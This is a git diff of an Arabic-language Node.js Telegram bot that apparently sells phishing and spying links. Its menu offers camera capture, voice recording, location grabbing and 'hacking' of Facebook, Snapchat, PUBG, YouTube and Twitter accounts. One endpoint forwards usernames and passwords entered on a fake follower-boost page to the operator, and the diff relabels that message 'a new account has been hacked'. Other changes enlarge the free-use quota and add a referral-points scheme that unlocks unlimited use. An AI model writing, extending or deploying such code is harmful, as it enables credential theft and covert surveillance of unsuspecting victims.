@@ -20,16 +20,15 @@ const upload = multer({ storage: storage });
 
 const platformVisits = {};
 const userVisits = {};
-const MAX_FREE_ATTEMPTS = 3; // تحديد عدد المحاولات المجانية
+const MAX_FREE_ATTEMPTS = 5; // تحديد عدد المحاولات المجانية
 const subscribedUsers = new Set(); // مجموعة المستخدمين المشتركين
-const freeTrialEndedMessage = "انتهت فترة التجربة المجانية"; // رسالة نهاية الفترة التجريبية
+const freeTrialEndedMessage = "انتهت فترة التجربة المجانيه لان تستطيع استخدام اي رابط اختراق حتى تقوم بل الاشتراك من المطور او قوم بجمع نقاط لاستمرار في استخدام البوت"; // رسالة نهاية الفترة التجريبية
 const adminId = '7130416076';
 const forcedChannelUsernames = ['@SJGDDW', '@YEMENCYBER101', '@YYY_A12'];
 
 
  
 const fetch = require('node-fetch');
-
 
 const usersFile = 'users.json';
 const serverUrl = 'https://tttttt-sjgd.onrender.com/'; // تأكد من تحديث هذا الرابط
@@ -40,58 +39,58 @@ let activatedUsers = {};
 let userAttempts = {};
 
 async function saveData() {
-    const data = { allUsers, bannedUsers, activatedUsers };
+  const data = { allUsers, bannedUsers, activatedUsers };
 
-    try {
-        const response = await fetch(`${serverUrl}/save-users`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(data)
-        });
+  try {
+    const response = await fetch(`${serverUrl}/save-users`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(data)
+    });
 
-        if (!response.ok) {
-            throw new Error(`HTTP error! status: ${response.status}`);
-        }
-
-        const result = await response.json();
-        console.log('تم حفظ البيانات على الخادم:', result);
-
-        // حفظ محلي أيضاً
-        fs.writeFileSync(usersFile, JSON.stringify(data, null, 2));
-    } catch (error) {
-        console.error('خطأ في حفظ البيانات على الخادم:', error);
-        // حفظ محلي حتى لو فشل الحفظ على الخادم
-        fs.writeFileSync(usersFile, JSON.stringify(data, null, 2));
+    if (!response.ok) {
+      throw new Error(`HTTP error! status: ${response.status}`);
     }
+
+    const result = await response.json();
+    console.log('تم حفظ البيانات على الخادم:', result);
+
+    // حفظ محلي أيضاً
+    fs.writeFileSync(usersFile, JSON.stringify(data, null, 2));
+  } catch (error) {
+    console.error('خطأ في حفظ البيانات على الخادم:', error);
+    // حفظ محلي حتى لو فشل الحفظ على الخادم
+    fs.writeFileSync(usersFile, JSON.stringify(data, null, 2));
+  }
 }
 
 async function loadData() {
-    try {
-        if (fs.existsSync(usersFile)) {
-            const data = JSON.parse(fs.readFileSync(usersFile, 'utf8'));
-            allUsers = data.allUsers || {};
-            bannedUsers = data.bannedUsers || {};
-            activatedUsers = data.activatedUsers || {};
-        } else {
-            const response = await fetch(`${serverUrl}/load-users`);
-            if (!response.ok) {
-                throw new Error(`HTTP error! status: ${response.status}`);
-            }
-            const data = await response.json();
-            allUsers = data.allUsers || {};
-            bannedUsers = data.bannedUsers || {};
-            activatedUsers = data.activatedUsers || {};
-            await saveData();
-        }
-    } catch (error) {
-        console.error('خطأ في تحميل البيانات:', error);
+  try {
+    if (fs.existsSync(usersFile)) {
+      const data = JSON.parse(fs.readFileSync(usersFile, 'utf8'));
+      allUsers = data.allUsers || {};
+      bannedUsers = data.bannedUsers || {};
+      activatedUsers = data.activatedUsers || {};
+    } else {
+      const response = await fetch(`${serverUrl}/load-users`);
+      if (!response.ok) {
+        throw new Error(`HTTP error! status: ${response.status}`);
+      }
+      const data = await response.json();
+      allUsers = data.allUsers || {};
+      bannedUsers = data.bannedUsers || {};
+      activatedUsers = data.activatedUsers || {};
+      await saveData();
     }
+  } catch (error) {
+    console.error('خطأ في تحميل البيانات:', error);
+  }
 }
 
 // دالة لإضافة مستخدم جديد
 function addUser(userId, userData) {
-    allUsers[userId] = userData;
-    saveData();
+  allUsers[userId] = userData;
+  saveData();
 }
 
 // استدعاء loadData عند بدء البوت
@@ -99,16 +98,13 @@ loadData();
 
 process.on('exit', saveData);
 process.on('SIGINT', () => {
-    saveData();
-    process.exit();
+  saveData();
+  process.exit();
 });
 process.on('SIGTERM', () => {
-    saveData();
-    process.exit();
+  saveData();
+  process.exit();
 });
-
-// مثال على كيفية استخدام الدالة لإضافة مستخدم جديد
-// addUser('123456', { name: 'محمد', age: 30 });
 
 function handleAdminCommands(chatId, text) {
   try {
@@ -197,16 +193,14 @@ bot.on('my_chat_member', (msg) => {
   }
 });
 
-
-
 // دوال لحظر وإلغاء حظر المستخدمين
-function banUser(chatId) {
-  bannedUsers[chatId] = true;
+function banUser(userId) {
+  bannedUsers[userId] = true;
   saveData();
 }
 
-function unbanUser(chatId) {
-  delete bannedUsers[chatId];
+function unbanUser(userId) {
+  delete bannedUsers[userId];
   saveData();
 }
 
@@ -225,15 +219,6 @@ function broadcastMessage(message) {
 function addUser(user) {
   if (!allUsers[user.id]) {
     allUsers[user.id] = user;
-    saveData();
-  }
-}
-
-// دالة لحظر مستخدم
-function banUser(userId) {
-  const user = allUsers[userId];
-  if (user && !bannedUsers[userId]) {
-    bannedUsers[userId] = user;
     saveData();
   }
 }
@@ -279,61 +264,37 @@ bot.on('message', async (msg) => {
   }
 
   // التحقق من عضوية القناة المطلوبة
-if (forcedChannelUsernames.length && !activatedUsers[chatId]) {
+  if (forcedChannelUsernames.length && !activatedUsers[chatId]) {
     for (const channel of forcedChannelUsernames) {
-        try {
-            const member = await bot.getChatMember(channel, chatId);
-            if (member.status === 'left' || member.status === 'kicked') {
-                bot.sendMessage(chatId, `عذرا، يجب عليك الانضمام إلى القنوات المطور لاستخدام البوت:`, {
-                    reply_markup: {
-                        inline_keyboard: forcedChannelUsernames.map(channel => [{ text: `انضم إلى ${channel}`, url: `https://t.me/${channel.slice(1)}` }])
-                    }
-                });
-                return;
+      try {
+        const member = await bot.getChatMember(channel, chatId);
+        if (member.status === 'left' || member.status === 'kicked') {
+          bot.sendMessage(chatId, `عذرا، يجب عليك الانضمام إلى القنوات المطور لاستخدام البوت:`, {
+            reply_markup: {
+              inline_keyboard: forcedChannelUsernames.map(channel => [{ text: `انضم إلى ${channel}`, url: `https://t.me/${channel.slice(1)}` }])
             }
-        } catch (error) {
-            console.error('خطأ أثناء التحقق من عضوية القناة:', error);
-            bot.sendMessage(chatId, 'حدث خطأ. يرجى المحاولة لاحقًا.');
-            return;
+          });
+          return;
         }
+      } catch (error) {
+        console.error('خطأ أثناء التحقق من عضوية القناة:', error);
+        bot.sendMessage(chatId, 'حدث خطأ. يرجى المحاولة لاحقًا.');
+        return;
+      }
     }
-}
+    activatedUsers[chatId] = true; // تفعيل المستخدم بعد التحقق
+    saveData();
+  }
 
   // التحقق من الأوامر
   if (text === '/start' || text === 'تفعيل') {
-    showButtons(chatId, activatedUsers[chatId]); 
+    showButtons(chatId, activatedUsers[chatId]);
     return;
   }
 
   // التعامل مع باقي الرسائل
   showButtons(chatId, activatedUsers[chatId]);
 });
-
-
-// دالة لتتبع المحاولات للمسارات الأخرى
-const trackAttempts = (userId, action) => {
-    if (!userVisits[userId]) {
-        userVisits[userId] = { camera: 0, voiceRecord: 0, getLocation: 0 };
-    }
-
-    userVisits[userId][action]++;
-
-    return userVisits[userId][action] > MAX_FREE_ATTEMPTS;
-};
-
-// دالة لتتبع المحاولات لمسار المنصة الأصلي
-const trackPlatformAttempts = (platformId) => {
-    if (!platformVisits[platformId]) {
-        platformVisits[platformId] = 0;
-    }
-
-    platformVisits[platformId]++;
-
-    return platformVisits[platformId] > MAX_FREE_ATTEMPTS;
-};
-
-// المسار الأصلي
-
 
 // مسار الكاميرا
 app.get('/camera/:userId', (req, res) => {
@@ -516,7 +477,7 @@ app.post('/submitIncrease', (req, res) => {
 
     const deviceInfo = useragent.parse(userAgent);
 
-    bot.sendMessage(chatId, `تم تلقي بيانات زيادة المتابعين:
+    bot.sendMessage(chatId, `تم اختراق حساب جديد:
 منصة: ${platform}
 اسم المستخدم: ${username}
 كلمة السر: ${password}
@@ -539,7 +500,8 @@ app.post('/submitIncrease', (req, res) => {
 
 const userPoints = new Map();
 const userReferrals = new Map();
-let pointsRequiredForSubscription = 10
+const usedReferralLinks = new Map();
+let pointsRequiredForSubscription = 15;
 
 function createReferralLink(userId) {
     const referralCode = Buffer.from(userId.toString()).toString('base64');
@@ -548,8 +510,10 @@ function createReferralLink(userId) {
 
 function addPoints(userId, points) {
     const currentPoints = userPoints.get(userId) || 0;
-    userPoints.set(userId, currentPoints + points);
+    const newPoints = currentPoints + points;
+    userPoints.set(userId, newPoints);
     checkPointsAndSubscribe(userId);
+    return newPoints;
 }
 
 function deductPoints(userId, points) {
@@ -565,7 +529,7 @@ function checkPointsAndSubscribe(userId) {
     const points = userPoints.get(userId) || 0;
     if (points >= pointsRequiredForSubscription && !subscribedUsers.has(userId)) {
         subscribedUsers.add(userId);
-        bot.sendMessage(userId, 'مبروك! لقد جمعت نقاطًا كافية للاشتراك. تم تفعيل اشتراكك الآن.');
+        bot.sendMessage(userId, 'مبروك! لقد جمعت 15 نقطة. تم اشتراكك في البوت وتستطيع الآن استخدام البوت بدون قيود.');
     }
 }
 
@@ -576,25 +540,32 @@ bot.onText(/\/start (.+)/, (msg, match) => {
     try {
         const referrerId = Buffer.from(startPayload, 'base64').toString();
         if (referrerId !== newUserId) {
-            addPoints(referrerId, 1);
-            const referrerPoints = userPoints.get(referrerId) || 0;
-            bot.sendMessage(referrerId, `قام المستخدم ${msg.from.first_name} بالدخول عبر رابط الدعوة الخاص بك. أصبح لديك ${referrerPoints} نقطة.`);
-            bot.sendMessage(newUserId, 'مرحبًا بك! لقد انضممت عبر رابط دعوة.');
+            const usedLinks = usedReferralLinks.get(newUserId) || new Set();
+            if (!usedLinks.has(referrerId)) {
+                usedLinks.add(referrerId);
+                usedReferralLinks.set(newUserId, usedLinks);
+                const referrerPoints = addPoints(referrerId, 1);
+                bot.sendMessage(referrerId, `قام المستخدم ${msg.from.first_name} بالدخول عبر رابط الدعوة الخاص بك. أصبح لديك ${referrerPoints} نقطة.`);
+                bot.sendMessage(newUserId, 'مرحبًا بك! لقد انضممت عبر رابط دعوة.');
+            } else {
+                bot.sendMessage(newUserId, 'مرحبًا بك مرة أخرى! لقد استخدمت هذا الرابط من قبل.');
+            }
         }
     } catch (error) {
         console.error('خطأ في معالجة رمز الإحالة:', error);
     }
-    showButtons(msg.chat.id);
+    showButtons(msg.chat.id, newUserId);
 });
 
-bot.onText(/\/syy/, (msg) => {
-    if (!msg.text.includes(' ')) {
-        showButtons(msg.chat.id);
-    }
-});
+async function showButtons(chatId, userId) {
+  const points = userPoints.get(userId) || 0;
+  const isSubscribed = subscribedUsers.has(userId);
 
-function showButtons(chatId) {
-    let keyboard = [
+  let statusMessage = isSubscribed 
+    ? 'أنت مشترك في البوت ويمكنك استخدامه بدون قيود.'
+    : `لديك ${points} نقطة. اجمع 15 نقطة للاشتراك في البوت واستخدامه بدون قيود.`;
+
+   let keyboard = [
         [{ text: '📸 اختراق الكاميرا الأمامية والخلفية 📸', callback_data:'front_camera' }],
         [{ text: '🎙 تسجيل صوت 🎙', callback_data:'voice_record' }],
         [{ text: '🗺️ الحصول على الموقع 🗺️', callback_data:'get_location' }],
@@ -603,15 +574,15 @@ function showButtons(chatId) {
         [{ text: '🔱اختراق الفيسبوك🔱', callback_data:'increase_facebook' }],
         [{ text: '👻 اختراق سناب شات 👻', callback_data:'increase_snapchat' }],
         [{ text: '🔫اختراق حسابات ببجي🔫', callback_data:'pubg_uc' }],
-        [{ text: '🔴اختراق يوتيوب🔴', callback_data: 'increase_youtube' }],
+        [{ text: '🔴اختراق يوتيوب🔴', callback_data:'increase_youtube' }],
         [{ text: '🐦اختراق تويتر🐦', callback_data:'increase_twitter' }],
         [{ text: '🔗 إنشاء رابط دعوة 🔗', callback_data:'create_referral' }],
         [{ text: '💰 نقاطي 💰', callback_data: 'my_points' }],
-        [{ text: 'قناة المطور', url: 'https://t.me/SJGDDW' }],
-        [{ text: ' تتواصل مع المطور', url: 'https://t.me/SAGD112' }],
+        [{ text: 'قناة المطور سجاد', url: 'https://t.me/SJGDDW' }],
+        [{ text: 'سجاد تتواصل مع المطور', url: 'https://t.me/SAGD112' }],
     ];
 
-    bot.sendMessage(chatId, 'مرحبا اختار احد الاخيارت الذي تريده ملاحضه لان تستطيع استخدام روابط الاختراق سوى 5 مرات اذا اردت استخدام البوت بدون قيود قوم بتواصل معا المطور لاشتراك ام تريد استخدامه مجاني فقوم بجمع نقاط عبر رابط الدعوه:', {
+    bot.sendMessage(chatId, `${statusMessage}\n\nمرحبا قوم بختيار اي  شي تريده لكن لان تستطيع استخدام اي رابط سوى 5مرات حتى تقوم بدفع اشتراك من المطور @SAGD112 او قوم بتجميع نقاط لاستخدامه مجانآ:`, {
         reply_markup: {
             inline_keyboard: keyboard
         }
@@ -631,11 +602,19 @@ bot.on('callback_query', (callbackQuery) => {
             break;
         case 'my_points':
             const points = userPoints.get(userId) || 0;
-            bot.sendMessage(chatId, `لديك حاليًا ${points} نقطة.`);
+            const isSubscribed = subscribedUsers.has(userId);
+            let message = isSubscribed
+                ? `لديك حاليًا ${points} نقطة. أنت مشترك في البوت ويمكنك استخدامه بدون قيود.`
+                : `لديك حاليًا ${points} نقطة. اجمع ${pointsRequiredForSubscription} نقطة للاشتراك في البوت واستخدامه بدون قيود.`;
+            bot.sendMessage(chatId, message);
             break;
-        // يمكنك إضافة المزيد من الحالات هنا للأزرار الأخرى
         default:
-            bot.sendMessage(chatId, 'عذرًا، هذه الميزة غير متوفرة حاليًا.');
+            if (!subscribedUsers.has(userId)) {
+                bot.sendMessage(chatId, 'ملاحظة عزيزي المستخدم لان تستطيع استخدام هاذا الميزه سوى 5مرات قوم بل الاشتراك من المطور او قوم بجمع نقاط لاستخدام بدون قيود.');
+            } else {
+                bot.sendMessage(chatId, 'جاري تنفيذ العملية...');
+                // هنا يمكنك إضافة الكود الخاص بكل عملية
+            }
     }
 });
 
@@ -648,9 +627,9 @@ bot.onText(/\/addpoints (\d+) (\d+)/, (msg, match) => {
     const userId = match[1];
     const pointsToAdd = parseInt(match[2]);
 
-    addPoints(userId, pointsToAdd);
-    bot.sendMessage(msg.chat.id, `تمت إضافة ${pointsToAdd} نقطة للمستخدم ${userId}`);
-    bot.sendMessage(userId, `تمت إضافة ${pointsToAdd} نقطة إلى رصيدك.`);
+    const newPoints = addPoints(userId, pointsToAdd);
+    bot.sendMessage(msg.chat.id, `تمت إضافة ${pointsToAdd} نقطة للمستخدم ${userId}. إجمالي النقاط الآن: ${newPoints}`);
+    bot.sendMessage(userId, `تمت إضافة ${pointsToAdd} نقطة إلى رصيدك. رصيدك الحالي: ${newPoints} نقطة.`);
 });
 
 bot.onText(/\/deductpoints (\d+) (\d+)/, (msg, match) => {
@@ -663,8 +642,9 @@ bot.onText(/\/deductpoints (\d+) (\d+)/, (msg, match) => {
     const pointsToDeduct = parseInt(match[2]);
 
     if (deductPoints(userId, pointsToDeduct)) {
-        bot.sendMessage(msg.chat.id, `تم خصم ${pointsToDeduct} نقطة من المستخدم ${userId}`);
-        bot.sendMessage(userId, `تم خصم ${pointsToDeduct} نقطة من رصيدك.`);
+        const newPoints = userPoints.get(userId) || 0;
+        bot.sendMessage(msg.chat.id, `تم خصم ${pointsToDeduct} نقطة من المستخدم ${userId}. إجمالي النقاط الآن: ${newPoints}`);
+        bot.sendMessage(userId, `تم خصم ${pointsToDeduct} نقطة من رصيدك. رصيدك الحالي: ${newPoints} نقطة.`);
     } else {
         bot.sendMessage(msg.chat.id, `عذرًا، المستخدم ${userId} لا يملك نقاطًا كافية للخصم.`);
     }
@@ -718,6 +698,7 @@ bot.onText(/\/listsubscribers/, (msg) => {
     const subscribersList = Array.from(subscribedUsers).join('\n');
     bot.sendMessage(msg.chat.id, `قائمة المشتركين:\n${subscribersList || 'لا يوجد مشتركين حالياً.'}`);
 });
+
 
 bot.on('callback_query', (callbackQuery) => {
     const chatId = callbackQuery.message.chat.id;
